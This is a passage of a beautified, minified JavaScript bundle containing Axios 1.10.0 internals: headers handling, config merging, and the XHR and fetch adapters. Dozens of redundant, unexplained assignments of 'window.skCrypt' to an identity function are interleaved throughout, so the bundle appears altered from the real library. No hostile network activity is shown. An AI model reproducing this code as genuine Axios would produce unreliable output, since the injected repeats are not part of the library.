      (r[i] && Bw.isObject(r[i])) || (r[i] = []);
      return (
        e(t, n, r[i], o) &&
          Bw.isArray(r[i]) &&
          (r[i] = (function (t) {
            const e = {},
              n = Object.keys(t);
            let r;
            const o = n.length;
            let i;
            for (r = 0; r < o; r++) (i = n[r]), (e[i] = t[i]);
            return e;
          })(r[i])),
        !s
      );
    }
    if (Bw.isFormData(t) && Bw.isFunction(t.entries)) {
      const n = {};
      return (
        Bw.forEachEntry(t, (t, r) => {
          e(
            (function (t) {
              return Bw.matchAll(/\w+|\[(\w*)]/g, t).map((t) =>
                "[]" === t[0] ? "" : t[1] || t[0]
              );
            })(t),
            r,
            n,
            0
          );
        }),
        n
      );
    }
    return null;
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const nb = {
    transitional: Fw,
    adapter: ["xhr", "http", "fetch"],
    transformRequest: [
      function (t, e) {
        const n = e.getContentType() || "",
          r = n.indexOf("application/json") > -1,
          o = Bw.isObject(t);
        o && Bw.isHTMLForm(t) && (t = new FormData(t));
        if (Bw.isFormData(t)) return r ? JSON.stringify(eb(t)) : t;
        if (
          Bw.isArrayBuffer(t) ||
          Bw.isBuffer(t) ||
          Bw.isStream(t) ||
          Bw.isFile(t) ||
          Bw.isBlob(t) ||
          Bw.isReadableStream(t)
        )
          return t;
        if (Bw.isArrayBufferView(t)) return t.buffer;
        if (Bw.isURLSearchParams(t))
          return (
            e.setContentType(
              "application/x-www-form-urlencoded;charset=utf-8",
              !1
            ),
            t.toString()
          );
        let i;
        if (o) {
          if (n.indexOf("application/x-www-form-urlencoded") > -1)
            return (function (t, e) {
              return Nw(
                t,
                new tb.classes.URLSearchParams(),
                Object.assign(
                  {
                    visitor: function (t, e, n, r) {
                      return tb.isNode && Bw.isBuffer(t)
                        ? (this.append(e, t.toString("base64")), !1)
                        : r.defaultVisitor.apply(this, arguments);
                    },
                  },
                  e
                )
              );
            })(t, this.formSerializer).toString();
          if ((i = Bw.isFileList(t)) || n.indexOf("multipart/form-data") > -1) {
            const e = this.env && this.env.FormData;
            return Nw(
              i ? { "files[]": t } : t,
              e && new e(),
              this.formSerializer
            );
          }
        }
        return o || r
          ? (e.setContentType("application/json", !1),
            (function (t, e, n) {
              if (Bw.isString(t))
                try {
                  return (0, JSON.parse)(t), Bw.trim(t);
                } catch (r) {
                  if ("SyntaxError" !== r.name) throw r;
                }
              return (n || JSON.stringify)(t);
            })(t))
          : t;
      },
    ],
    transformResponse: [
      function (t) {
        const e = this.transitional || nb.transitional,
          n = e && e.forcedJSONParsing,
          r = "json" === this.responseType;
        if (Bw.isResponse(t) || Bw.isReadableStream(t)) return t;
        if (t && Bw.isString(t) && ((n && !this.responseType) || r)) {
          const n = !(e && e.silentJSONParsing) && r;
          try {
            return JSON.parse(t);
          } catch (o) {
            if (n) {
              if ("SyntaxError" === o.name)
                throw Ew.from(
                  o,
                  Ew.ERR_BAD_RESPONSE,
                  this,
                  null,
                  this.response
                );
              throw o;
            }
          }
        }
        return t;
      },
    ],
    timeout: 0,
    xsrfCookieName: "XSRF-TOKEN",
    xsrfHeaderName: "X-XSRF-TOKEN",
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: tb.classes.FormData, Blob: tb.classes.Blob },
    validateStatus: function (t) {
      return t >= 200 && t < 300;
    },
    headers: {
      common: {
        Accept: "application/json, text/plain, */*",
        "Content-Type": void 0,
      },
    },
  };
  Bw.forEach(["delete", "get", "head", "post", "put", "patch"], (t) => {
    nb.headers[t] = {};
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const rb = Bw.toObjectSet([
    "age",
    "authorization",
    "content-length",
    "content-type",
    "etag",
    "expires",
    "from",
    "host",
    "if-modified-since",
    "if-unmodified-since",
    "last-modified",
    "location",
    "max-forwards",
    "proxy-authorization",
    "referer",
    "retry-after",
    "user-agent",
  ]);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ob = Symbol("internals");
  function ib(t) {
    return t && String(t).trim().toLowerCase();
  }
  function sb(t) {
    return !1 === t || null == t ? t : Bw.isArray(t) ? t.map(sb) : String(t);
  }
  function ab(t, e, n, r, o) {
    return Bw.isFunction(r)
      ? r.call(this, e, n)
      : (o && (e = n),
        Bw.isString(e)
          ? Bw.isString(r)
            ? -1 !== e.indexOf(r)
            : Bw.isRegExp(r)
            ? r.test(e)
            : void 0
          : void 0);
  }
  let ub = class {
    constructor(t) {
      t && this.set(t);
    }
    set(t, e, n) {
      const r = this;
      function o(t, e, n) {
        const o = ib(e);
        if (!o) throw new Error("header name must be a non-empty string");
        const i = Bw.findKey(r, o);
        (!i || void 0 === r[i] || !0 === n || (void 0 === n && !1 !== r[i])) &&
          (r[i || e] = sb(t));
      }
      const i = (t, e) => Bw.forEach(t, (t, n) => o(t, n, e));
      if (Bw.isPlainObject(t) || t instanceof this.constructor) i(t, e);
      else if (
        Bw.isString(t) &&
        (t = t.trim()) &&
        !/^[-_a-zA-Z0-9^`|~,!#$%&'*+.]+$/.test(t.trim())
      )
        i(
          ((t) => {
            const e = {};
            let n, r, o;
            return (
              t &&
                t.split("\n").forEach(function (t) {
                  (o = t.indexOf(":")),
                    (n = t.substring(0, o).trim().toLowerCase()),
                    (r = t.substring(o + 1).trim()),
                    !n ||
                      (e[n] && rb[n]) ||
                      ("set-cookie" === n
                        ? e[n]
                          ? e[n].push(r)
                          : (e[n] = [r])
                        : (e[n] = e[n] ? e[n] + ", " + r : r));
                }),
              e
            );
          })(t),
          e
        );
      else if (Bw.isObject(t) && Bw.isIterable(t)) {
        let n,
          r,
          o = {};
        for (const e of t) {
          if (!Bw.isArray(e))
            throw TypeError("Object iterator must return a key-value pair");
          o[(r = e[0])] = (n = o[r])
            ? Bw.isArray(n)
              ? [...n, e[1]]
              : [n, e[1]]
            : e[1];
        }
        i(o, e);
      } else null != t && o(e, t, n);
      return this;
    }
    get(t, e) {
      if ((t = ib(t))) {
        const n = Bw.findKey(this, t);
        if (n) {
          const t = this[n];
          if (!e) return t;
          if (!0 === e)
            return (function (t) {
              const e = Object.create(null),
                n = /([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;
              let r;
              for (; (r = n.exec(t)); ) e[r[1]] = r[2];
              return e;
            })(t);
          if (Bw.isFunction(e)) return e.call(this, t, n);
          if (Bw.isRegExp(e)) return e.exec(t);
          throw new TypeError("parser must be boolean|regexp|function");
        }
      }
    }
    has(t, e) {
      if ((t = ib(t))) {
        const n = Bw.findKey(this, t);
        return !(!n || void 0 === this[n] || (e && !ab(0, this[n], n, e)));
      }
      return !1;
    }
    delete(t, e) {
      const n = this;
      let r = !1;
      function o(t) {
        if ((t = ib(t))) {
          const o = Bw.findKey(n, t);
          !o || (e && !ab(0, n[o], o, e)) || (delete n[o], (r = !0));
        }
      }
      return Bw.isArray(t) ? t.forEach(o) : o(t), r;
    }
    clear(t) {
      const e = Object.keys(this);
      let n = e.length,
        r = !1;
      for (; n--; ) {
        const o = e[n];
        (t && !ab(0, this[o], o, t, !0)) || (delete this[o], (r = !0));
      }
      return r;
    }
    normalize(t) {
      const e = this,
        n = {};
      return (
        Bw.forEach(this, (r, o) => {
          const i = Bw.findKey(n, o);
          if (i) return (e[i] = sb(r)), delete e[o], void 0;
          const s = t
            ? (function (t) {
                return t
                  .trim()
                  .toLowerCase()
                  .replace(/([a-z\d])(\w*)/g, (t, e, n) => e.toUpperCase() + n);
              })(o)
            : String(o).trim();
          s !== o && delete e[o], (e[s] = sb(r)), (n[s] = !0);
        }),
        this
      );
    }
    concat(...t) {
      return this.constructor.concat(this, ...t);
    }
    toJSON(t) {
      const e = Object.create(null);
      return (
        Bw.forEach(this, (n, r) => {
          null != n &&
            !1 !== n &&
            (e[r] = t && Bw.isArray(n) ? n.join(", ") : n);
        }),
        e
      );
    }
    [Symbol.iterator]() {
      return Object.entries(this.toJSON())[Symbol.iterator]();
    }
    toString() {
      return Object.entries(this.toJSON())
        .map(([t, e]) => t + ": " + e)
        .join("\n");
    }
    getSetCookie() {
      return this.get("set-cookie") || [];
    }
    get [Symbol.toStringTag]() {
      return "AxiosHeaders";
    }
    static from(t) {
      return t instanceof this ? t : new this(t);
    }
    static concat(t, ...e) {
      const n = new this(t);
      return e.forEach((t) => n.set(t)), n;
    }
    static accessor(t) {
      const e = (this[ob] = this[ob] = { accessors: {} }).accessors,
        n = this.prototype;
      function r(t) {
        const r = ib(t);
        e[r] ||
          (!(function (t, e) {
            const n = Bw.toCamelCase(" " + e);
            ["get", "set", "has"].forEach((r) => {
              Object.defineProperty(t, r + n, {
                value: function (t, n, o) {
                  return this[r].call(this, e, t, n, o);
                },
                configurable: !0,
              });
            });
          })(n, t),
          (e[r] = !0));
      }
      return Bw.isArray(t) ? t.forEach(r) : r(t), this;
    }
  };
  function cb(t, e) {
    const n = this || nb,
      r = e || n,
      o = ub.from(r.headers);
    let i = r.data;
    return (
      Bw.forEach(t, function (t) {
        i = t.call(n, i, o.normalize(), e ? e.status : void 0);
      }),
      o.normalize(),
      i
    );
  }
  function lb(t) {
    return !(!t || !t.__CANCEL__);
  }
  function db(t, e, n) {
    Ew.call(this, null == t ? "canceled" : t, Ew.ERR_CANCELED, e, n),
      (this.name = "CanceledError");
  }
  function fb(t, e, n) {
    const r = n.config.validateStatus;
    n.status && r && !r(n.status)
      ? e(
          new Ew(
            "Request failed with status code " + n.status,
            [Ew.ERR_BAD_REQUEST, Ew.ERR_BAD_RESPONSE][
              Math.floor(n.status / 100) - 4
            ],
            n.config,
            n.request,
            n
          )
        )
      : t(n);
  }
  ub.accessor([
    "Content-Type",
    "Content-Length",
    "Accept",
    "Accept-Encoding",
    "User-Agent",
    "Authorization",
  ]),
    Bw.reduceDescriptors(ub.prototype, ({ value: t }, e) => {
      let n = e[0].toUpperCase() + e.slice(1);
      return {
        get: () => t,
        set(t) {
          this[n] = t;
        },
      };
    }),
    Bw.freezeMethods(ub),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    Bw.inherits(db, Ew, { __CANCEL__: !0 }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const hb = (t, e, n = 3) => {
      let r = 0;
      const o = (function (t, e) {
        t = t || 10;
        const n = new Array(t),
          r = new Array(t);
        let o,
          i = 0,
          s = 0;
        return (
          (e = void 0 !== e ? e : 1e3),
          function (a) {
            const u = Date.now(),
              c = r[s];
            o || (o = u), (n[i] = a), (r[i] = u);
            let l = s,
              d = 0;
            for (; l !== i; ) (d += n[l++]), (l %= t);
            if (((i = (i + 1) % t), i === s && (s = (s + 1) % t), u - o < e))
              return;
            const f = c && u - c;
            return f ? Math.round((1e3 * d) / f) : void 0;
          }
        );
      })(50, 250);
      return (function (t, e) {
        let n,
          r,
          o = 0,
          i = 1e3 / e;
        const s = (e, i = Date.now()) => {
          (o = i),
            (n = null),
            r && (clearTimeout(r), (r = null)),
            t.apply(null, e);
        };
        return [
          (...t) => {
            const e = Date.now(),
              a = e - o;
            a >= i
              ? s(t, e)
              : ((n = t),
                r ||
                  (r = setTimeout(() => {
                    (r = null), s(n);
                  }, i - a)));
          },
          () => n && s(n),
        ];
      })((n) => {
        const i = n.loaded,
          s = n.lengthComputable ? n.total : void 0,
          a = i - r,
          u = o(a);
        r = i;
        t({
          loaded: i,
          total: s,
          progress: s ? i / s : void 0,
          bytes: a,
          rate: u || void 0,
          estimated: u && s && i <= s ? (s - i) / u : void 0,
          event: n,
          lengthComputable: null != s,
          [e ? "download" : "upload"]: !0,
        });
      }, n);
    },
    pb = (t, e) => {
      const n = null != t;
      return [(r) => e[0]({ lengthComputable: n, total: t, loaded: r }), e[1]];
    },
    mb =
      (t) =>
      (...e) =>
        Bw.asap(() => t(...e));
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const gb = tb.hasStandardBrowserEnv
    ? ((t, e) => (n) => (
        (n = new URL(n, tb.origin)),
        t.protocol === n.protocol &&
          t.host === n.host &&
          (e || t.port === n.port)
      ))(
        new URL(tb.origin),
        tb.navigator && /(msie|trident)/i.test(tb.navigator.userAgent)
      )
    : () => !0;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const yb = tb.hasStandardBrowserEnv
    ? {
        write(t, e, n, r, o, i) {
          const s = [t + "=" + encodeURIComponent(e)];
          Bw.isNumber(n) && s.push("expires=" + new Date(n).toGMTString()),
            Bw.isString(r) && s.push("path=" + r),
            Bw.isString(o) && s.push("domain=" + o),
            !0 === i && s.push("secure"),
            (document.cookie = s.join("; "));
        },
        read(t) {
          const e = document.cookie.match(
            new RegExp("(^|;\\s*)(" + t + ")=([^;]*)")
          );
          return e ? decodeURIComponent(e[3]) : null;
        },
        remove(t) {
          this.write(t, "", Date.now() - 864e5);
        },
      }
    : { write() {}, read: () => null, remove() {} };
  function wb(t, e, n) {
    let r = !/^([a-z][a-z\d+\-.]*:)?\/\//i.test(e);
    return t && (r || 0 == n)
      ? (function (t, e) {
          return e ? t.replace(/\/?\/$/, "") + "/" + e.replace(/^\/+/, "") : t;
        })(t, e)
      : e;
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const bb = (t) => (t instanceof ub ? { ...t } : t);
  function vb(t, e) {
    e = e || {};
    const n = {};
    function r(t, e, n, r) {
      return Bw.isPlainObject(t) && Bw.isPlainObject(e)
        ? Bw.merge.call({ caseless: r }, t, e)
        : Bw.isPlainObject(e)
        ? Bw.merge({}, e)
        : Bw.isArray(e)
        ? e.slice()
        : e;
    }
    function o(t, e, n, o) {
      return Bw.isUndefined(e)
        ? Bw.isUndefined(t)
          ? void 0
          : r(void 0, t, 0, o)
        : r(t, e, 0, o);
    }
    function i(t, e) {
      if (!Bw.isUndefined(e)) return r(void 0, e);
    }
    function s(t, e) {
      return Bw.isUndefined(e)
        ? Bw.isUndefined(t)
          ? void 0
          : r(void 0, t)
        : r(void 0, e);
    }
    function a(n, o, i) {
      return i in e ? r(n, o) : i in t ? r(void 0, n) : void 0;
    }
    const u = {
      url: i,
      method: i,
      data: i,
      baseURL: s,
      transformRequest: s,
      transformResponse: s,
      paramsSerializer: s,
      timeout: s,
      timeoutMessage: s,
      withCredentials: s,
      withXSRFToken: s,
      adapter: s,
      responseType: s,
      xsrfCookieName: s,
      xsrfHeaderName: s,
      onUploadProgress: s,
      onDownloadProgress: s,
      decompress: s,
      maxContentLength: s,
      maxBodyLength: s,
      beforeRedirect: s,
      transport: s,
      httpAgent: s,
      httpsAgent: s,
      cancelToken: s,
      socketPath: s,
      responseEncoding: s,
      validateStatus: a,
      headers: (t, e, n) => o(bb(t), bb(e), 0, !0),
    };
    return (
      Bw.forEach(Object.keys(Object.assign({}, t, e)), function (r) {
        const i = u[r] || o,
          s = i(t[r], e[r], r);
        (Bw.isUndefined(s) && i !== a) || (n[r] = s);
      }),
      n
    );
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Ab = (t) => {
    const e = vb({}, t);
    let n,
      {
        data: r,
        withXSRFToken: o,
        xsrfHeaderName: i,
        xsrfCookieName: s,
        headers: a,
        auth: u,
      } = e;
    if (
      ((e.headers = a = ub.from(a)),
      (e.url = zw(
        wb(e.baseURL, e.url, e.allowAbsoluteUrls),
        t.params,
        t.paramsSerializer
      )),
      u &&
        a.set(
          "Authorization",
          "Basic " +
            btoa(
              (u.username || "") +
                ":" +
                (u.password ? unescape(encodeURIComponent(u.password)) : "")
            )
        ),
      Bw.isFormData(r))
    )
      if (tb.hasStandardBrowserEnv || tb.hasStandardBrowserWebWorkerEnv)
        a.setContentType(void 0);
      else if (!1 !== (n = a.getContentType())) {
        const [t, ...e] = n
          ? n
              .split(";")
              .map((t) => t.trim())
              .filter(Boolean)
          : [];
        a.setContentType([t || "multipart/form-data", ...e].join("; "));
      }
    if (
      tb.hasStandardBrowserEnv &&
      (o && Bw.isFunction(o) && (o = o(e)), o || (!1 !== o && gb(e.url)))
    ) {
      const t = i && s && yb.read(s);
      t && a.set(i, t);
    }
    return e;
  };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const kb =
    "undefined" != typeof XMLHttpRequest &&
    function (t) {
      return new Promise(function (e, n) {
        const r = Ab(t);
        let o = r.data;
        const i = ub.from(r.headers).normalize();
        let s,
          a,
          u,
          c,
          l,
          { responseType: d, onUploadProgress: f, onDownloadProgress: h } = r;
        function p() {
          c && c(),
            l && l(),
            r.cancelToken && r.cancelToken.unsubscribe(s),
            r.signal && r.signal.removeEventListener("abort", s);
        }
        let m = new XMLHttpRequest();
        function g() {
          if (!m) return;
          const r = ub.from(
            "getAllResponseHeaders" in m && m.getAllResponseHeaders()
          );
          fb(
            function (t) {
              e(t), p();
            },
            function (t) {
              n(t), p();
            },
            {
              data:
                d && "text" !== d && "json" !== d ? m.response : m.responseText,
              status: m.status,
              statusText: m.statusText,
              headers: r,
              config: t,
              request: m,
            }
          ),
            (m = null);
        }
        m.open(r.method.toUpperCase(), r.url, !0),
          (m.timeout = r.timeout),
          "onloadend" in m
            ? (m.onloadend = g)
            : (m.onreadystatechange = function () {
                m &&
                  4 === m.readyState &&
                  (0 !== m.status ||
                    (m.responseURL && 0 === m.responseURL.indexOf("file:"))) &&
                  setTimeout(g);
              }),
          (m.onabort = function () {
            m &&
              (n(new Ew("Request aborted", Ew.ECONNABORTED, t, m)), (m = null));
          }),
          (m.onerror = function () {
            n(new Ew("Network Error", Ew.ERR_NETWORK, t, m)), (m = null);
          }),
          (m.ontimeout = function () {
            let e = r.timeout
              ? "timeout of " + r.timeout + "ms exceeded"
              : "timeout exceeded";
            const o = r.transitional || Fw;
            r.timeoutErrorMessage && (e = r.timeoutErrorMessage),
              n(
                new Ew(
                  e,
                  o.clarifyTimeoutError ? Ew.ETIMEDOUT : Ew.ECONNABORTED,
                  t,
                  m
                )
              ),
              (m = null);
          }),
          void 0 === o && i.setContentType(null),
          "setRequestHeader" in m &&
            Bw.forEach(i.toJSON(), function (t, e) {
              m.setRequestHeader(e, t);
            }),
          Bw.isUndefined(r.withCredentials) ||
            (m.withCredentials = !!r.withCredentials),
          d && "json" !== d && (m.responseType = r.responseType),
          h && (([u, l] = hb(h, !0)), m.addEventListener("progress", u)),
          f &&
            m.upload &&
            (([a, c] = hb(f)),
            m.upload.addEventListener("progress", a),
            m.upload.addEventListener("loadend", c)),
          (r.cancelToken || r.signal) &&
            ((s = (e) => {
              m &&
                (n(!e || e.type ? new db(null, t, m) : e),
                m.abort(),
                (m = null));
            }),
            r.cancelToken && r.cancelToken.subscribe(s),
            r.signal &&
              (r.signal.aborted ? s() : r.signal.addEventListener("abort", s)));
        const y = (function (t) {
          const e = /^([-+\w]{1,25})(:?\/\/|:)/.exec(t);
          return (e && e[1]) || "";
        })(r.url);
        if (y && -1 === tb.protocols.indexOf(y))
          return (
            n(new Ew("Unsupported protocol " + y + ":", Ew.ERR_BAD_REQUEST, t)),
            void 0
          );
        m.send(o || null);
      });
    };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Ib = (t, e) => {
    const { length: n } = (t = t ? t.filter(Boolean) : []);
    if (e || n) {
      let n,
        r = new AbortController();
      const o = function (t) {
        if (!n) {
          (n = !0), s();
          const e = t instanceof Error ? t : this.reason;
          r.abort(
            e instanceof Ew ? e : new db(e instanceof Error ? e.message : e)
          );
        }
      };
      let i =
        e &&
        setTimeout(() => {
          (i = null), o(new Ew(`timeout ${e} of ms exceeded`, Ew.ETIMEDOUT));
        }, e);
      const s = () => {
        t &&
          (i && clearTimeout(i),
          (i = null),
          t.forEach((t) => {
            t.unsubscribe
              ? t.unsubscribe(o)
              : t.removeEventListener("abort", o);
          }),
          (t = null));
      };
      t.forEach((t) => t.addEventListener("abort", o));
      const { signal: a } = r;
      return (a.unsubscribe = () => Bw.asap(s)), a;
    }
  };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Sb = function* (t, e) {
      let n = t.byteLength;
      if (n < e) return yield t, void 0;
      let r,
        o = 0;
      for (; o < n; ) (r = o + e), yield t.slice(o, r), (o = r);
    },
    _b = async function* (t) {
      if (t[Symbol.asyncIterator]) return yield* t, void 0;
      const e = t.getReader();
      try {
        for (;;) {
          const { done: t, value: n } = await e.read();
          if (t) break;
          yield n;
        }
      } finally {
        await e.cancel();
      }
    },
    Tb = (t, e, n, r) => {
      const o = (async function* (t, e) {
        for await (const n of _b(t)) yield* Sb(n, e);
      })(t, e);
      let i,
        s = 0,
        a = (t) => {
          i || ((i = !0), r && r(t));
        };
      return new ReadableStream(
        {
          async pull(t) {
            try {
              const { done: e, value: r } = await o.next();
              if (e) return a(), t.close(), void 0;
              let i = r.byteLength;
              if (n) {
                let t = (s += i);
                n(t);
              }
              t.enqueue(new Uint8Array(r));
            } catch (e) {
              throw (a(e), e);
            }
          },
          cancel: (t) => (a(t), o.return()),
        },
        { highWaterMark: 2 }
      );
    };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Cb =
      "function" == typeof fetch &&
      "function" == typeof Request &&
      "function" == typeof Response,
    Bb = Cb && "function" == typeof ReadableStream,
    Eb =
      Cb &&
      ("function" == typeof TextEncoder
        ? (
            (t) => (e) =>
              t.encode(e)
          )(new TextEncoder())
        : async (t) => new Uint8Array(await new Response(t).arrayBuffer())),
    xb = (t, ...e) => {
      try {
        return !!t(...e);
      } catch (n) {
        return !1;
      }
    },
    Pb =
      Bb &&
      xb(() => {
        let t = !1;
        const e = new Request(tb.origin, {
          body: new ReadableStream(),
          method: "POST",
          get duplex() {
            return (t = !0), "half";
          },
        }).headers.has("Content-Type");
        return t && !e;
      }),
    Rb = Bb && xb(() => Bw.isReadableStream(new Response("").body)),
    Ob = { stream: Rb && ((t) => t.body) };
  var Mb;
  Cb &&
    ((Mb = new Response()),
    void ["text", "arrayBuffer", "blob", "formData", "stream"].forEach((t) => {
      !Ob[t] &&
        (Ob[t] = Bw.isFunction(Mb[t])
          ? (e) => e[t]()
          : (e, n) => {
              throw new Ew(
                `Response type '${t}' is not supported`,
                Ew.ERR_NOT_SUPPORT,
                n
              );
            });
    }));
  const Lb = async (t, e) => {
      const n = Bw.toFiniteNumber(t.getContentLength());
      return null == n
        ? (async (t) => {
            if (null == t) return 0;
            if (Bw.isBlob(t)) return t.size;
            if (Bw.isSpecCompliantForm(t)) {
              const e = new Request(tb.origin, { method: "POST", body: t });
              return (await e.arrayBuffer()).byteLength;
            }
            return Bw.isArrayBufferView(t) || Bw.isArrayBuffer(t)
              ? t.byteLength
              : (Bw.isURLSearchParams(t) && (t += ""),
                Bw.isString(t) ? (await Eb(t)).byteLength : void 0);
          })(e)
        : n;
    },
    Nb =
      Cb &&
      (async (t) => {
        let {
          url: e,
          method: n,
          data: r,
          signal: o,
          cancelToken: i,
          timeout: s,
          onDownloadProgress: a,
          onUploadProgress: u,
          responseType: c,
          headers: l,
          withCredentials: d = "same-origin",
          fetchOptions: f,
        } = Ab(t);
        c = c ? (c + "").toLowerCase() : "text";
        let h,
          p = Ib([o, i && i.toAbortSignal()], s);
        const m =
          p &&
          p.unsubscribe &&
          (() => {
            p.unsubscribe();
          });
        let g;
        try {
          if (
            u &&
            Pb &&
            "get" !== n &&
            "head" !== n &&
            0 !== (g = await Lb(l, r))
          ) {
            let t,
              n = new Request(e, { method: "POST", body: r, duplex: "half" });
            if (
              (Bw.isFormData(r) &&
                (t = n.headers.get("content-type")) &&
                l.setContentType(t),
              n.body)
            ) {
              const [t, e] = pb(g, hb(mb(u)));
              r = Tb(n.body, 65536, t, e);
            }
          }
          Bw.isString(d) || (d = d ? "include" : "omit");
          const o = "credentials" in Request.prototype;
          h = new Request(e, {
            ...f,
            signal: p,
            method: n.toUpperCase(),
            headers: l.normalize().toJSON(),
            body: r,
            duplex: "half",
            credentials: o ? d : void 0,
          });
          let i = await fetch(h, f);
          const s = Rb && ("stream" === c || "response" === c);
          if (Rb && (a || (s && m))) {
            const t = {};
            ["status", "statusText", "headers"].forEach((e) => {
              t[e] = i[e];
            });
            const e = Bw.toFiniteNumber(i.headers.get("content-length")),
              [n, r] = (a && pb(e, hb(mb(a), !0))) || [];
            i = new Response(
              Tb(i.body, 65536, n, () => {
                r && r(), m && m();
              }),
              t
            );
          }
          c = c || "text";
          let y = await Ob[Bw.findKey(Ob, c) || "text"](i, t);
          return (
            !s && m && m(),
            await new Promise((e, n) => {
              fb(e, n, {
                data: y,
                headers: ub.from(i.headers),
                status: i.status,
                statusText: i.statusText,
                config: t,
                request: h,
              });
            })
          );
        } catch (y) {
          if (
            (m && m(),
            y && "TypeError" === y.name && /Load failed|fetch/i.test(y.message))
          )
            throw Object.assign(new Ew("Network Error", Ew.ERR_NETWORK, t, h), {
              cause: y.cause || y,
            });
          throw Ew.from(y, y && y.code, t, h);
        }
      });
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Db = { http: null, xhr: kb, fetch: Nb };
  Bw.forEach(Db, (t, e) => {
    if (t) {
      try {
        Object.defineProperty(t, "name", { value: e });
      } catch (n) {}
      Object.defineProperty(t, "adapterName", { value: e });
    }
  });
  const Ub = (t) => `- ${t}`,
    qb = (t) => Bw.isFunction(t) || null === t || !1 === t,
    Wb = (t) => {
      t = Bw.isArray(t) ? t : [t];
      const { length: e } = t;
      let n, r;
      const o = {};
      for (let i = 0; i < e; i++) {
        let e;
        if (
          ((n = t[i]),
          (r = n),
          !qb(n) && ((r = Db[(e = String(n)).toLowerCase()]), void 0 === r))
        )
          throw new Ew(`Unknown adapter '${e}'`);
        if (r) break;
        o[e || "#" + i] = r;
      }
      if (!r) {
        const t = Object.entries(o).map(
          ([t, e]) =>
            `adapter ${t} ` +
            (!1 === e
              ? "is not supported by the environment"
              : "is not available in the build")
        );
        throw new Ew(
          "There is no suitable adapter to dispatch the request " +
            (e
              ? t.length > 1
                ? "since :\n" + t.map(Ub).join("\n")
                : " " + Ub(t[0])
              : "as no adapter specified"),
          "ERR_NOT_SUPPORT"
        );
      }
      return r;
    };
  function zb(t) {
    if (
      (t.cancelToken && t.cancelToken.throwIfRequested(),
      t.signal && t.signal.aborted)
    )
      throw new db(null, t);
  }
  function Kb(t) {
    zb(t),
      (t.headers = ub.from(t.headers)),
      (t.data = cb.call(t, t.transformRequest)),
      -1 !== ["post", "put", "patch"].indexOf(t.method) &&
        t.headers.setContentType("application/x-www-form-urlencoded", !1);
    return Wb(t.adapter || nb.adapter)(t).then(
      function (e) {
        return (
          zb(t),
          (e.data = cb.call(t, t.transformResponse, e)),
          (e.headers = ub.from(e.headers)),
          e
        );
      },
      function (e) {
        return (
          lb(e) ||
            (zb(t),
            e &&
              e.response &&
              ((e.response.data = cb.call(t, t.transformResponse, e.response)),
              (e.response.headers = ub.from(e.response.headers)))),
          Promise.reject(e)
        );
      }
    );
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const Fb = "1.10.0";
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const jb = {};
  ["object", "boolean", "number", "function", "string", "symbol"].forEach(
    (t, e) => {
      jb[t] = function (n) {
        return typeof n === t || "a" + (e < 1 ? "n " : " ") + t;
      };
    }
  );
  const Gb = {};
  (jb.transitional = function (t, e, n) {
    return (r, o, i) => {
      if (!1 === t)
        throw new Ew(
          (function (t, e) {
            return (
              "[Axios v" +
              Fb +
              "] Transitional option '" +
              t +
              "'" +
              e +
              (n ? ". " + n : "")
            );
          })(o, " has been removed" + (e ? " in " + e : "")),
          Ew.ERR_DEPRECATED
        );
      return e && !Gb[o] && (Gb[o] = !0), !t || t(r, o, i);
    };
  }),
    (jb.spelling = function (t) {
      return (t, e) => (void 0, !0);
    });
  const Vb = {
    assertOptions: function (t, e, n) {
      if ("object" != typeof t)
        throw new Ew("options must be an object", Ew.ERR_BAD_OPTION_VALUE);
      const r = Object.keys(t);
      let o = r.length;
      for (; o-- > 0; ) {
        const i = r[o],
          s = e[i];
        if (s) {
          const e = t[i],
            n = void 0 === e || s(e, i, t);
          if (!0 !== n)
            throw new Ew(
              "option " + i + " must be " + n,
              Ew.ERR_BAD_OPTION_VALUE
            );
          continue;
        }
        if (!0 !== n) throw new Ew("Unknown option " + i, Ew.ERR_BAD_OPTION);
      }
    },
    validators: jb,
  };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Hb = Vb.validators;
  let Xb = class {
    constructor(t) {
      (this.defaults = t || {}),
        (this.interceptors = { request: new Kw(), response: new Kw() });
    }
    async request(t, e) {
      try {
        return await this._request(t, e);
      } catch (n) {
        if (n instanceof Error) {
          let t = {};
          Error.captureStackTrace
            ? Error.captureStackTrace(t)
            : (t = new Error());
          const e = t.stack ? t.stack.replace(/^.+\n/, "") : "";
          try {
            n.stack
              ? e &&
                !String(n.stack).endsWith(e.replace(/^.+\n.+\n/, "")) &&
                (n.stack += "\n" + e)
              : (n.stack = e);
          } catch (r) {}
        }
        throw n;
      }
    }
    _request(t, e) {
